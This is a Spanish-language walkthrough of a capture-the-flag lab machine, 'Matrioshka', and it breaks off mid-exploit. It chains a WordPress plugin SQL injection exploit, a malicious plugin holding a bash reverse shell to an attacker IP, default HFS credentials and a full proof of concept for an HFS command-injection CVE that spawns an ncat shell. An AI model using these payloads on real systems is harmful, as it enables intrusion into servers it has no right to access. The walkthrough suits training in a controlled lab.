![[banner.png]]
### Machine Name: Matrioshka/Mamushka

`​DDth:22 Month:08 YYYY:2024`

Machine Author(s): [GalileoQ](https://app.hackthebox.com/profile/overview) - [b0ySie7e](https://app.hackthebox.com/users/417609) 

### Description:
This machine combines various vulnerabilities in a Docker container environment. The machine includes two containers, each with its own set of challenges.

The first container runs a WordPress website that uses a plugin vulnerable to SQL injection. By exploiting this vulnerability, it is possible to gain access to the database and eventually compromise the system.

The second container runs an HTTP server vulnerable to remote code execution. This vulnerability allows attackers to gain access to the container. Furthermore, this container is configured with a Docker breakout vulnerability, allowing attackers to escalate privileges and compromise the host.

The Matrioshka challenge tests players' ability to identify and chain multiple attack vectors, from exploiting web vulnerabilities to escalating privileges using advanced Docker breakout techniques.

### Difficulty:

`easy`

### Flags:

User: `<md5>`

Root: `<md5>`

### Automation / Crons
Due to a problem when exporting the machine in `.ova` format we decided to create a service which is responsible for ensuring that the containers are always running.

1) Create the service file
```python
sudo nano /etc/systemd/system/docker-compose-restart.service

This command opens the `nano` text editor with superuser privileges (`sudo`) to create a `systemd` service file called `docker-compose-restart.service`.

```

2) Contents of docker-compose-restart.service service
```python
[Unit]
Description=Restarts Docker Compose at a specified path with a delay after the full startup
After=network.target

[Service]
Type=oneshot
WorkingDirectory=/root/docker-hfs/
ExecStartPre=/bin/sleep 3
ExecStart=/usr/bin/docker-compose down
ExecStartPost=/bin/sleep 5
ExecStartPost=/usr/bin/docker-compose up -d

[Install]
WantedBy=default.target

This file defines a `systemd` service that, once activated, will do the following:

1. Wait 3 seconds.
2. Stop all containers defined in the `docker-compose.yml` file in `/root/.docker-hfs/`.
3. It will wait for 5 seconds.
4. It will restart the containers in the background.

The service is a oneshot service, meaning it will run these actions once and then terminate.


3) Reload systemd configuration
python
sudo systemctl daemon-reload

This command reloads the systemd configuration to recognize the new service file.

4) Enable the service
python
sudo systemctl enable docker-compose-restart.service

This command enables the service to run automatically at system startup.
```

### Firewall Rules
`NONE`

---------------------------------------------------
### Ping

```python
ping -c 1 10.0.2.24
PING 10.0.2.24 (10.0.2.24) 56(84) bytes of data.
64 bytes from 10.0.2.24: icmp_seq=1 ttl=64 time=0.524 ms

--- 10.0.2.24 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.524/0.524/0.524/0.000 ms
```

### TTL = 64 Linux

### nmap
sudo nmap -p- -open -sCV --min-rate 5000 -n -Pn 10.0.2.24

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 b5:a4:7c:65:5c:1f:d7:89:42:bd:76:df:2c:8e:93:4e (ECDSA)
|_  256 5d:3d:2b:43:fc:89:fa:24:a3:f4:73:5f:7b:89:6c:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: mamushka
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 08:00:27:05:CB:78 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.19 seconds
```

### Enumeración del puerto 80 (http)
en la primera parte de la web podemos observar que la web contiene 8 apartados ( `Account,Login,Logout,Members,Password Reset,Register,Simple Page,User` ) también observamos una barra de búsqueda y al final de la web un panel de registro de usuarios. 
todos estos apartados aunque interesantes no nos proporcionan un camino ni tampoco son la vía intencionada para esta primera incursión 
![[Pasted image 20240822205025.png]]

![[Pasted image 20240822205106.png]]

![[Pasted image 20240822205132.png]]

![[Pasted image 20240822205146.png]]

### Fuzzing con gobuster
en nuestra enumeración con gobuster encontramos tres directorios los cuales nos indican que nos estamos enfrentando a una web diseñada en WordPress
![[Pasted image 20240822210221.png]]

### nuclei
realizando un escaneo con nuclei podemos conseguir una CVE en este caso es la CVE-2024-27956 la cual esta albergada en un plugin de wordpress. 
![[Pasted image 20240822223658.png]]

### wfuff
podemos verificar esto usando una wordlist de wordpress actualizada que podemos conseguir en este repositorio [Wordlist-Wordpress](https://github.com/kongsec/Wordpress-BruteForce-List/blob/main/Fuzz)
![[Pasted image 20240822224231.png]]

### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad                                        | Tipo | Nivel | Link                                                    |
| -------------- | ------------------------------------------------------------------ | ---- | ----- | ------------------------------------------------------- |
| CVE-2024-27956 | SQL Injection Vulnerability in ValvePress Automatic (WP-Automatic) | RCE  | 9.9   | [link](https://nvd.nist.gov/vuln/detail/CVE-2024-27956) |
|                |                                                                    |      |       |                                                         |
|                |                                                                    |      |       |                                                         |

### explotación De La CVE
para la explotación de esta CVE usaremos el siguiente repositorio [github](https://github.com/diego-tella/CVE-2024-27956-RCE) en este punto solo debemos ejecutar el exploit con el siguiente comando

```python
python3 exploit.py http://mamushka.htb/
```

este exploit se aprovecha de la vulnerabilidad SQL Injection para crear un usuario y una password validas en el WordPress 
![[Pasted image 20240822225246.png]]

### wp-login
en este punto solo debemos navegar hasta el panel de login del WordPress e ingresar con las credenciales que hemos creado 
![[Pasted image 20240822225440.png]]

`Login`
finalmente estamos dentro del WordPress
![[Pasted image 20240822225549.png]]

### Reverse shell
para obtener una reverse shell en este wordpress no es posible editar un plugin ya que es nos dara el siguiente mensaja 
¨Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.¨ 
esto nos deja con la posibilidad de aplicar un poco de  pensamiento lateral y es que.... si hemos creado un usuario administrador podriamos tener la oportunidad de subir un archivo.zip como un plugin pero que dentro contenga nuestra carga útil para ejecutar una reverse shell esto lo podemos encontrar haciendo una búsqueda rápida en Google  [reverse-shell](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)

`rshell.php`
```python
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.8/9001 0>&1'");
?>
```

![[Pasted image 20240823135507.png]]

`rshell.zip`
ahora con zip vamos a transformar nuestro archivo rshell.php a un archivo zip para poder cargarlo al wordpress
![[Pasted image 20240823135844.png]]

`Add New Plugin`

![[Pasted image 20240823133503.png]]

`Upload Plugin`
seleccionamos `Browser` buscamos nuestro archivo `rshell.zip` que se encuentra alojado en nuestra maquina y lo instalamos
![[Pasted image 20240823140110.png]]

### netcat
antes de activar el plugin es importante establecer nuestra escucha por el puerto que hemos configurado en nuestra carga util
![[Pasted image 20240823140404.png]]

`Activate Plugin`
una ves hecho todo esto solo nos queda activar el plugin
![[Pasted image 20240823134328.png]]

`www-data`
de esta manera logramos nuestra primera intrusión en la maquina 
![[Pasted image 20240823140638.png]]

### Enumeración del contenedor
en este punto debemos enumerar las variables `env` para darnos cuenta que podemos obtener un usuario y su contraseña 

```python
Username: matrioshka

Password: Fukurokuju
```

![[Pasted image 20240823140911.png]]

### ssh
establecemos una conexión vía ssh con las credenciales que hemos capturado y efectivamente estamos dentro como el usuario `matrioshka` y podemos ver la `user.txt`
![[Pasted image 20240823141641.png]]

### Enumeración de la maquina
haciendo uso de `netstat -atunp` podemos identificar dos puertos que estan corriendo en local `127.0.0.1:8080 - 127.0.0.1:9090` idealmente deberiamos realizar un `Port Forwarding` para ambos puertos. pero en este caso no sera necesario ya que nosotros sabemos que el puerto adecuado seria el 9090. 
![[Pasted image 20240823142129.png]]

### Port Forwarding
realizamos un `Port Forwarding` del puerto `9090` a nuestra localhost por el puerto `9090`

```python
ssh -L 9090:127.0.0.1:9090 matrioshka@10.0.2.24
```

![[Pasted image 20240823142717.png]]

### Enumeración web (127.0.0.1:9090)
efectivamente podemos ver la nueva web. 
esta web se trata de un HFS (HTTP File Server) es un software de intercambio de archivos que le permite enviar y recibir archivos
![[Pasted image 20240823142949.png]]

`Codigo Fuente`
analizando un poco el código fuente podemos identificar el CMS en este caso `HFS` y la versión en este caso es `0.52.9` 

```python
 HFS = { "VERSION": "0.52.9"
```

![[Pasted image 20240823143824.png]]

### login
debido a que este servicio carece de unas credenciales por defecto debemos realizar algunas pruebas comunes como serian `admin:admin` haciendo clic en el botón de login tendremos un `pop-up` para poder iniciar sesión
![[Pasted image 20240823144326.png]]

### admin
efectivamente las credenciales por defecto son `admin:admin`
![[Pasted image 20240823144512.png]]

`Admin-panel`
haciendo clic en la el botón `Options` tenemos otro `pop-up` en el cual podemos hacer clic en `Admin-panel` y esto nos llevara a la pagina del servidor
![[Pasted image 20240823144708.png]]

### HFS 
efectivamente podemos ver la pagina web y también podemos ver la versión. entre otras cosas podemos ver el apartado de `logs`
![[Pasted image 20240823144941.png]]

### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad         | Tipo | Nivel | Link                                                    |
| -------------- | ----------------------------------- | ---- | ----- | ------------------------------------------------------- |
| CVE-2024-39943 | Remote Code Execution Vulnerability | RCE  | 9.9   | [Link](https://nvd.nist.gov/vuln/detail/CVE-2024-39943) |
|                |                                     |      |       |                                                         |
|                |                                     |      |       |                                                         |

### Explotación CVE-2024-39943
para explotar esta vulnerabilidad vamos hacer uso del siguiente exploit [github](https://github.com/truonghuuphuc/CVE-2024-39943-Poc) podríamos usar cualquiera de los dos poc tanto el `poc_user_admin.py` como el `poc_user_gest.py` solo existe una pequeña variante que se explica en el repositorio de github. para este caso usaremos el `poc_user_admin.py` 
![[Pasted image 20240823150012.png]]

`poc_user_admin.py`
```python
import requests as req
import base64

url = input("Url: ")
cookie = input("Cookie: ")
ip = input("Ip: ")
port = input("Port: ")

headers = {"x-hfs-anti-csrf":"1","Cookie":cookie}

print("Step 1 add vfs")
step1 = req.post(url+"~/api/add_vfs", headers=headers, json={"parent":"/","source":"/tmp"})

print("Step 2 set permission vfs")
step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"sourc>

print("Step 3 create folder")
command = "ncat {0} {1} -e /bin/bash".format(ip,port)
command = command.encode('utf-8')
payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})

print("Step 4 execute payload")
step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
```

### ejecución del exploit 
ejecutamos el exploit y primero nos pide la URL la cual seria `127.0.0.1:9090` ya que la web esta corriendo de manera local en nuestra maquina por el puerto 9090
![[Pasted image 20240823150521.png]]

para las cookies solo debemos ir al apartado de inspeccionar - storage y aqui podemos ver las cookies 
![[Pasted image 20240823150440.png]]

ejecutamos el exploit y en este caso no recibimos nada. vamos a analizar la web para ver los logs y identificar el problema
![[Pasted image 20240823150830.png]]

### logs
capturamos el logs donde se ha realizado la petición para decodearla y analizarla. en este caso solo nos interesa lo que esta dentro de los paréntesis es decir la parte que esta encodeada en base 64 
![[Pasted image 20240823151120.png]]

`base64`
decodeamos el base64 para darnos cuenta que se esta solicitando una petición con `netcat` debido a que estamos haciendo un `Port Fordwarding` probablemente este segundo contenedor o maquina no tenga instalado el netcat así que vamos a realizar una pequeña modificación en el código 
![[Pasted image 20240823151856.png]]

